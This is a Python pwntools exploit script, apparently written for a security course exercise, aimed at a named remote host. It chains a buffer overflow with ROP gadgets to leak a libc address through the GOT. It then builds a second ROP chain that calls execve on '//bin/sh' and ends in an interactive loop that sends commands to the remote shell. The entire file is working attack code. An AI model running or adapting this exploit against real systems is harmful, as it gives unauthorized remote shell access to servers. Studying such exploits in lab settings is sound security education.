import sys 
from struct import pack
import socket
from pwn import *
import signal 

# first: read from the got by letting the server write its content
# second: get a shell 

def signal_handler(sig, frame):
    print("Exiting ...")
    exit()

signal.signal(signal.SIGINT, signal_handler)

p = lambda x : p64(x)
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7000
offset_to_rip = 0x30 + 8
got = 0x6011f8 + 24
gadget1 = 0x0000000000400cb9 #: pop rsi; pop r15; ret;
dummy = b'B'*8
write_plt = 0x00000000004007c0

with socket.create_connection((host, port)) as s:
    
    buf = b"A"*offset_to_rip
    buf += p64(gadget1)
    buf += p64(got)
    buf += dummy
    buf += p64(write_plt)

    s.send(buf)
    b = s.recv(1000)
    print("Bytes received: {} , Bytes sent: {}".format(len(b), len(buf)))
    b = b[len(buf):]
    setsockopt_address = b[0:8]
    #setsockopt_address =  struct.unpack("Q", setsockopt_address)[0]
    setsockopt_address = int.from_bytes(setsockopt_address, "little")
    print(hex(setsockopt_address))


setsockopt_offset = 0x0000000000faa60 # in standard library
libc_base_address = setsockopt_address - setsockopt_offset
print("Libc address: {}".format(hex(libc_base_address)))


with remote(host, port) as conn:

    print("Sending ROP chain for shell ...")

    IMAGE_BASE_0 = libc_base_address

    rop = b"A"*offset_to_rip
    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000023a5f) # 0x0000000000023a5f: pop rdi; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000002440e) # 0x000000000002440e: pop rsi; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x0000000000106725) # 0x0000000000106725: pop rdx; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000003a638) # 0x000000000003a638: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000b5b35) # 0x00000000000b5b35: syscall; ret; 
        
    conn.send(rop)
    conn.recv(len(rop))
    
    while True:
        command = input("$ ")
        conn.send(command.encode())
        print(conn.recv(4096).decode())
